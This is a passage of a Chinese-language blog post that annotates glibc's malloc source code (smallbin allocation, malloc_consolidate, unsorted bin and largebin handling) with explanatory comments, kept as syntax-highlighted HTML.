keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断取出来的下一个chunk的fd是不是刚才取出的哪个victim,不等于的话就报错</span>                <span class="token punctuation">{</span>                  errstr <span class="token operator">=</span> <span class="token string">"malloc(): smallbin double linked list corrupted"</span><span class="token punctuation">;</span>                  <span class="token keyword">goto</span> errout<span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>               bin<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//恢复链表</span>              bck<span class="token operator">-></span>fd <span class="token operator">=</span> bin<span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                victim<span class="token operator">-></span>size <span class="token operator">|</span><span class="token operator">=</span> NON_MAIN_ARENA<span class="token punctuation">;</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//返回mem指针</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      idx <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//没有合适的就去largebin</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">have_fastchunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">malloc_consolidate</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>可以看到这里面必须要说一下<strong>malloc_consolidatel()</strong>了</p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><p>其实初始化操作都是在第一次malloc的时候做的奥。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">malloc_consolidate</span><span class="token punctuation">(</span>mstate av<span class="token punctuation">)</span><span class="token punctuation">{</span>  mfastbinptr<span class="token operator">*</span>    fb<span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">/* current fastbin being consolidated */</span>  mfastbinptr<span class="token operator">*</span>    maxfb<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* last fastbin (for loop control) */</span>  mchunkptr       p<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* current chunk being consolidated */</span>  mchunkptr       nextp<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* next chunk to consolidate */</span>  mchunkptr       unsorted_bin<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* bin header */</span>  mchunkptr       first_unsorted<span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/* chunk to link to */</span>  <span class="token comment" spellcheck="true">/* These have same use as in free() */</span>  mchunkptr       nextchunk<span class="token punctuation">;</span>  INTERNAL_SIZE_T size<span class="token punctuation">;</span>  INTERNAL_SIZE_T nextsize<span class="token punctuation">;</span>  INTERNAL_SIZE_T prevsize<span class="token punctuation">;</span>  <span class="token keyword">int</span>             nextinuse<span class="token punctuation">;</span>  mchunkptr       bck<span class="token punctuation">;</span>  mchunkptr       fwd<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/*    If max_fast is 0, we know that av hasn't    yet been initialized, in which case do so below  */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_max_fast</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">clear_fastchunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//标记fastbin中的空闲堆块，其实就是利用异或使得pre_inuse位清0</span>    unsorted_bin <span class="token operator">=</span> <span class="token function">unsorted_chunks</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//通过arena找到对应的unsorted bin</span>    <span class="token comment" spellcheck="true">/*      Remove each chunk from fast bin and consolidate it, placing it      then in unsorted bin. Among other reasons for doing this,      placing in unsorted bin avoids needing to calculate actual bins      until malloc is sure that chunks aren't immediately going to be      reused anyway.    */</span>    maxfb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> NFASTBINS <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//fastbin里面最大的堆块的malloc_chunk指针</span>    fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//fastbin里面最小的堆块的malloc_chunk指针</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//从这里开始就是通过循环遍历各种链表置NULL</span>      p <span class="token operator">=</span> <span class="token function">atomic_exchange_acq</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>      <span class="token function">check_inuse_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//名字就很清楚</span>      nextp <span class="token operator">=</span> p<span class="token operator">-></span>fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//改chunk的fd指针</span>      <span class="token comment" spellcheck="true">/* Slightly streamlined version of consolidation code in free() */</span>      size <span class="token operator">=</span> p<span class="token operator">-></span>size <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>PREV_INUSE<span class="token operator">|</span>NON_MAIN_ARENA<span class="token punctuation">)</span><span class="token punctuation">;</span>      nextchunk <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>      nextsize <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        prevsize <span class="token operator">=</span> p<span class="token operator">-></span>prev_size<span class="token punctuation">;</span>        size <span class="token operator">+</span><span class="token operator">=</span> prevsize<span class="token punctuation">;</span>        p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//隐式链表找到上一个chunk进行unlink操作</span>        <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nextchunk <span class="token operator">!=</span> av<span class="token operator">-></span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>        nextinuse <span class="token operator">=</span> <span class="token function">inuse_bit_at_offset</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">,</span> nextsize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nextinuse<span class="token punctuation">)</span> <span class="token punctuation">{</span>          size <span class="token operator">+</span><span class="token operator">=</span> nextsize<span class="token punctuation">;</span>          <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> nextchunk<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span>          <span class="token function">clear_inuse_bit_at_offset</span><span class="token punctuation">(</span>nextchunk<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        first_unsorted <span class="token operator">=</span> unsorted_bin<span class="token operator">-></span>fd<span class="token punctuation">;</span>        unsorted_bin<span class="token operator">-></span>fd <span class="token operator">=</span> p<span class="token punctuation">;</span>        first_unsorted<span class="token operator">-></span>bk <span class="token operator">=</span> p<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          p<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>          p<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">set_head</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token operator">-></span>bk <span class="token operator">=</span> unsorted_bin<span class="token punctuation">;</span>        p<span class="token operator">-></span>fd <span class="token operator">=</span> first_unsorted<span class="token punctuation">;</span>        <span class="token function">set_foot</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token punctuation">{</span>        size <span class="token operator">+</span><span class="token operator">=</span> nextsize<span class="token punctuation">;</span>        <span class="token function">set_head</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>        av<span class="token operator">-></span>top <span class="token operator">=</span> p<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> nextp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fb<span class="token operator">++</span> <span class="token operator">!=</span> maxfb<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">malloc_init_state</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">check_malloc_state</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>smallbin中没有合适的就利用largebin_index来计算出一个idx，然后就进去了unsorted bin的判断</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      idx <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">have_fastchunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//判断是否初始化</span>        <span class="token function">malloc_consolidate</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//arena初始化</span>    <span class="token punctuation">}</span></code></pre><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//起始部分</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">int</span> iters <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断unsorted bin里面有没有空闲chunk</span>        <span class="token punctuation">{</span>          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//从unsorted bin 里面取出来</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>              <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断size是否合法</span>            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span>                             <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>          size <span class="token operator">=</span> <span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//求出取出的chunk的size</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>              bck <span class="token operator">==</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>              victim <span class="token operator">==</span> av<span class="token operator">-></span>last_remainder <span class="token operator">&amp;&amp;</span>              <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//判断是否属于smallbin,并且unsorted bin里面只有这一个chunk，并且chunk输入last remainder chunk,同时size打入用户需要的chunk_size加上最小chunk的size，（其实就是判断能不能拆成两个chunk）</span>            <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">/* split and reattach remainder */</span>              remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>              remainder <span class="token operator">=</span> <span class="token function">chunk_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>fd <span class="token operator">=</span> remainder<span class="token punctuation">;</span>              av<span class="token operator">-></span>last_remainder <span class="token operator">=</span> remainder<span class="token punctuation">;</span>              remainder<span class="token operator">-></span>bk <span class="token operator">=</span> remainder<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//这里和以上就是拆分和分配操作了</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>remainder_size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//拆分分配给用户后剩余的remainder的size不在small bin,fd，bk指针全置0</span>                <span class="token punctuation">{</span>                  remainder<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                  remainder<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token function">set_head</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>                        <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置分配给用户的chunk_head</span>              <span class="token function">set_head</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//这两是设置拆分后没用到的chunk</span>              <span class="token function">set_foot</span> <span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//返回申请到的chunk</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//不满足上述判断的话，就清空unsorted bin </span>          <span class="token comment" spellcheck="true">/* remove from unsorted list */</span>          <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>          bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/* Take now instead of binning if exact fit */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> nb<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果size刚好等于用户申请的chunk大小,直接in_use位清0，返回指针。</span>            <span class="token punctuation">{</span>              <span class="token function">set_inuse_bit_at_offset</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span>                victim<span class="token operator">-></span>size <span class="token operator">|</span><span class="token operator">=</span> NON_MAIN_ARENA<span class="token punctuation">;</span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">/* place chunk in bin */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果size在small bin就直接插入该链表</span>            <span class="token punctuation">{</span>              victim_index <span class="token operator">=</span> <span class="token function">smallbin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>              bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>              fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token keyword">else</span>            <span class="token punctuation">{</span>              victim_index <span class="token operator">=</span> <span class="token function">largebin_index</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//插入large bin</span>              bck <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>              fwd <span class="token operator">=</span> bck<span class="token operator">-></span>fd<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">/* maintain large bins in sorted order */</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>fwd <span class="token operator">!=</span> bck<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断large bin是否为空</span>                <span class="token punctuation">{</span>                  <span class="token comment" spellcheck="true">/* Or with inuse bit to speed comparisons */</span>                  size <span class="token operator">|</span><span class="token operator">=</span> PREV_INUSE<span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">/* if smaller than smallest, bypass loop below */</span>                  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>bk<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//</span>                    <span class="token punctuation">{</span>                      fwd <span class="token operator">=</span> bck<span class="token punctuation">;</span>                      bck <span class="token operator">=</span> bck<span class="token operator">-></span>bk<span class="token punctuation">;</span>                      victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>                      victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                      fwd<span class="token operator">-></span>fd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                  <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                      <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fwd<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">&lt;</span> fwd<span class="token operator">-></span>size<span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                          fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>                          <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fwd<span class="token operator">-></span>size <span class="token operator">&amp;</span> NON_MAIN_ARENA<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> size <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> fwd<span class="token operator">-></span>size<span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">/* Always insert in the second position.  */</span>                        fwd <span class="token operator">=</span> fwd<span class="token operator">-></span>fd<span class="token punctuation">;</span>                      <span class="token keyword">else</span>                        <span class="token punctuation">{</span>                          victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>                          victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>                          fwd<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                          victim<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                      bck <span class="token operator">=</span> fwd<span class="token operator">-></span>bk<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>              <span class="token keyword">else</span>                victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> victim<span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token function">mark_bin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim_index<span class="token punctuation">)</span><span class="token punctuation">;</span>          victim<span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>          victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>          fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>          bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">define</span> MAX_ITERS       10000</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>iters <span class="token operator">>=</span> MAX_ITERS<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//遍历比申请chunk大的所有large bin链表</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/*         If a large request, scan through the chunks of current bin in         sorted order to find smallest that fits.  Use the skip list for this.       */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          bin <span class="token operator">=</span> <span class="token function">bin_at</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">/* skip scan if empty or largest chunk is too small */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">first</span> <span class="token punctuation">(</span>bin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> bin <span class="token operator">&amp;&amp;</span>              <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token 